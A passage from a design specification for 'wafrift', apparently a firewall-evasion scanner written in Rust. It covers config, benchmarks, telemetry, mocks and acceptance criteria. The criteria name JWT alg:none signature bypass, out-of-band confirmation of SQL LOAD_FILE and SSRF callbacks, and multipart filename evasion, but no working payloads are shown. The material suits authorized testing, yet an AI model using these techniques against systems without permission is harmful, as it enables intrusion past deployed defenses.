- `textual_diff` on 10KB payloads → <5ms median.

---

## 8. Cross-Cutting Concerns

### 8.1 Performance Budgets

| Feature | P95 Latency Budget | Benchmark File |
|---------|-------------------|----------------|
| Context-aware encoding | ≤ 1.05× generic encoding | `encoding/benches/contextual.rs` |
| Session cookie load | ≤ 5ms | `transport/benches/session.rs` |
| CSRF extraction | ≤ 1ms per 1MB body | `transport/benches/session.rs` |
| JWT manipulation | ≤ 2ms | `transport/benches/jwt.rs` |
| OpenAPI parse (1MB) | ≤ 100ms | `recon/benches/discovery.rs` |
| Param mining (100 params) | ≤ 5s total | `recon/benches/discovery.rs` |
| OOB poll iteration | ≤ 1ms | `oracle/benches/oob.rs` |
| Protobuf serialize | ≤ 2ms | `content-type/benches/formats.rs` |
| Explanation generation | ≤ 50ms | `detect/benches/explain.rs` |
| Diff (10KB) | ≤ 5ms | `strategy/benches/explain.rs` |

**CI gate:** Criterion regression >5% fails build.

### 8.2 Security Requirements

| Concern | Requirement | Test File |
|---------|-------------|-----------|
| Session isolation | Cookies/auth from host-a never sent to host-b | `transport/tests/security_session.rs` |
| JWT key secrecy | Key never appears in logs or gene banks | `transport/tests/security_session.rs` |
| File permissions | Session files created with `0o600` | `transport/tests/security_session.rs` |
| OOB canary randomness | UUIDv4 (crypto-random), no sequential pattern | `oracle/tests/security_oob.rs` |
| OOB canary uniqueness | 10,000 generations → zero collisions (birthday bound) | `oracle/tests/security_oob.rs` |
| Context escape prevention | No injection of CR/LF in headers, no null in JSON strings | `encoding/tests/security_contextual.rs` |
| Protobuf safety | Negative varint lengths → error, not panic | `content-type/tests/security_formats.rs` |

### 8.3 Configuration Schema

All features are configurable via `.wafrift.toml` with environment variable overrides:

```toml
[context]
auto_detect = true
default = "PlainBody"
strict = false

[session]
cookie_jar = "~/.wafrift/sessions/{host}.jar"
csrf_regex = '<meta name="csrf-token" content="([^"]+)"'
csrf_injection = "header"
auth_header = "Authorization: Bearer ..."
jwt_manipulation = "strip_alg"
jwt_key = "c2VjcmV0LWtleQ=="

[discovery]
wordlist = "~/.wafrift/wordlists/params.txt"
concurrency = 4
delay_ms = 100
auto_detect_context = true

[oob]
provider = "interactsh"
server = "https://oast.pro"
poll_interval_secs = 5
timeout_secs = 30

[formats]
protobuf_enabled = true
messagepack_enabled = true
grpc_web_enabled = true
multipart_filename_evasion = true

[explain]
enabled = true
mode = "standard"
max_diff_size_kb = 10
max_hunks = 50
```

**Environment variable mapping:**
- `WAFRIFT_CONTEXT_AUTO_DETECT` → `context.auto_detect`
- `WAFRIFT_SESSION_COOKIE_JAR` → `session.cookie_jar`
- `WAFRIFT_OOB_PROVIDER` → `oob.provider`
- `WAFRIFT_EXPLAIN_MODE` → `explain.mode`

All env vars override TOML values. Missing sections default to disabled/empty behavior.

### 8.4 Telemetry & Observability

All features emit structured `tracing` spans:

| Feature | Span Name | Level | Fields |
|---------|-----------|-------|--------|
| Context encoding | `contextual_encode` | DEBUG | strategy, context, payload_len |
| Context skip | `contextual_skip` | DEBUG | strategy, context, reason |
| Session load | `session_load_jar` | INFO | path, cookie_count |
| CSRF extract | `csrf_extract` | DEBUG | url, found |
| JWT manipulate | `jwt_manipulate` | DEBUG | manipulation, alg_before, alg_after |
| Discovery | `discovery` | INFO | source, endpoints_found |
| Param mining | `param_mine` | INFO | target, candidates, valid_found |
| OOB register | `oob_register` | INFO | provider, canary_dns |
| OOB confirm | `oob_confirm` | INFO | canary_id, result |
| OOB timeout | `oob_timeout` | WARN | canary_id, elapsed_secs |
| Format serialize | `format_serialize` | DEBUG | format, payload_len |
| Explanation | `explain_bypass` | DEBUG | waf, rules_found, mode |

### 8.5 Backward Compatibility

- All new CLI flags are optional.
- All new config sections are optional; missing = disabled.
- `encode_in_context` with `None` context delegates to existing `encode()`.
- `EvasionClient::new()` remains unchanged; `with_session()` is additive.
- Gene bank JSON format is extended, not replaced. Old genomes load without error.

---

## 9. Acceptance Criteria (Definition of Done)

### 9.1 Per-Feature Acceptance

**Feature 1 (Context-Aware Encoding):**
- [ ] All 16 contexts have unit tests with ≥90% coverage.
- [ ] Proptest round-trip invariants pass 10,000 iterations.
- [ ] E2E test demonstrates JSON body bypass where generic encoding fails.
- [ ] Performance regression <5% vs. baseline.

**Feature 2 (Session Handling):**
- [ ] Cookie jar persists across scan stages.
- [ ] CSRF token extracted and replayed automatically.
- [ ] JWT `alg:none` bypasses signature validation in E2E test.
- [ ] Session isolation test: host-a cookies never sent to host-b.
- [ ] JWT key does not appear in logs at INFO level or above.

**Feature 3 (Parameter Discovery):**
- [ ] OpenAPI 2.0 and 3.0 specs parse correctly.
- [ ] GraphQL introspection discovers mutations.
- [ ] Param mining finds hidden parameter in differential mock.
- [ ] Output is valid JSON pipeable into `wafrift scan --from-discovery`.

**Feature 4 (OOB Confirmation):**
- [ ] Mock OOB provider confirms SQL `LOAD_FILE` bypass.
- [ ] Mock OOB provider confirms SSRF callback.
- [ ] 50 concurrent confirmations with zero UUID collisions.
- [ ] Timeout handled gracefully (no panic, no infinite loop).

**Feature 5 (Modern Formats):**
- [ ] Protobuf round-trip test passes.
- [ ] MessagePack round-trip test passes.
- [ ] gRPC-Web frame structure validated (compression flag + length).
- [ ] Multipart filename evasion produces ≥5 variants.
- [ ] Mock server accepts protobuf payload after WAF blocks JSON equivalent.

**Feature 6 (Explanations):**
- [ ] `explain_block` correctly attributes ModSecurity rule against `UNION`.
- [ ] `explain_bypass` generates human-readable summary for 5 representative cases.
- [ ] Snapshot tests pass for all explanation modes.
- [ ] Educational mode includes "why this works" paragraph.

### 9.2 Global Acceptance
- [ ] `cargo test --workspace` passes.
- [ ] `cargo clippy --workspace` passes with zero warnings.
- [ ] Line coverage ≥90% for new code, ≥85% for modified code.
- [ ] Criterion benchmarks show <5% regression.
- [ ] Fuzz tests run 1M iterations without crash.
- [ ] Security tests (isolation, key secrecy, permissions) pass.
- [ ] README updated with new flags and examples.
- [ ] Man pages updated (`wafrift-scan.1`, `wafrift-discover.1`, etc.).

---

## 10. Appendix

### 10.1 Glossary
- **Context-aware encoding:** Encoding that preserves structural validity of the payload within its destination format (JSON, XML, etc.).
- **Gene bank:** Persistent per-WAF storage of successful evasion techniques.
- **Horizontal gene transfer:** Reuse of learned techniques across different targets protected by the same WAF.
- **OOB (Out-of-Band):** Confirmation that a payload executed via an external callback (DNS, HTTP).
- **PayloadType:** Classification of payload intent (SQL, XSS, CMD, etc.).
- **Rule attribution:** Mapping a bypass to the specific WAF rule that was circumvented.

### 10.2 Mock Implementations for Testing

All test suites should use these mocks:

**MockWaf:**
```rust
pub struct MockWaf {
    pub block_rules: Vec<Regex>,
    pub response_forbidden: Response,
}
impl MockWaf {
    pub fn is_blocked(&self, payload: &str) -> bool {
        self.block_rules.iter().any(|r| r.is_match(payload))
    }
}
```

**MockOobProvider:**
```rust
pub struct MockOobProvider {
    interactions: Arc<Mutex<HashMap<Uuid, Vec<OobInteraction>>>>,
}
#[async_trait]
impl OobProvider for MockOobProvider {
    async fn register(&self) -> Result<OobCanary, OobError> { /* ... */ }
    async fn poll(&self, canary: &OobCanary) -> Result<Vec<OobInteraction>, OobError> {
        Ok(self.interactions.lock().get(&canary.id).cloned().unwrap_or_default())
    }
}
```

**MockGraphQlServer:**
```rust
pub struct MockGraphQlServer {
    introspection_response: String,
}
```

### 10.3 File Paths Summary

| File | Purpose |
|------|---------|
| `crates/types/src/injection_context.rs` | `InjectionContext` enum |
| `crates/types/src/session.rs` | `SessionConfig`, `JwtManipulation` |
| `crates/types/src/oob.rs` | `OobConfig`, `OobCanary`, `OobInteraction` |
| `crates/types/src/discovery.rs` | `DiscoveredEndpoint`, `InjectionPoint` |
| `crates/types/src/explanation.rs` | `Explanation`, `RuleAttribution`, `DiffHunk` |
| `crates/types/src/format.rs` | `BodyFormat` |
| `crates/encoding/src/contextual.rs` | `encode_in_context`, `escape_for_context`, `validate_in_context` |
| `crates/grammar/src/contextual.rs` | `mutate_in_context` |
| `crates/transport/src/session.rs` | `SessionState`, `load_jar`, `save_jar`, `extract_csrf`, `inject_csrf` |
| `crates/transport/src/jwt.rs` | `manipulate` |
| `crates/recon/src/discovery/openapi.rs` | `from_openapi` |
| `crates/recon/src/discovery/graphql.rs` | `from_graphql` |
| `crates/recon/src/discovery/param_miner.rs` | `mine_params` |
| `crates/recon/src/discovery/context.rs` | `auto_detect_context` |
| `crates/oracle/src/oob/provider.rs` | `OobProvider` trait |
| `crates/oracle/src/oob/oracle.rs` | `OobOracle` |
| `crates/oracle/src/oob/embed.rs` | `embed_canary` |
| `crates/content-type/src/formats/mod.rs` | `serialize`, `deserialize` |
| `crates/content-type/src/formats/protobuf.rs` | Protobuf encoding |
| `crates/content-type/src/formats/messagepack.rs` | MessagePack encoding |
| `crates/content-type/src/formats/grpc_web.rs` | gRPC-Web framing |
| `crates/content-type/src/multipart_enhanced.rs` | Filename evasion |
| `crates/detect/src/explain.rs` | `explain_block` |
| `crates/strategy/src/explain.rs` | `explain_bypass`, `generate_human_summary` |
| `crates/strategy/src/pipeline.rs` | Updated `EvasionPipeline` with new stages |
| `crates/cli/src/discover/mod.rs` | `wafrift discover` subcommand |
| `crates/cli/src/scan/mod.rs` | Updated scan with new flags |
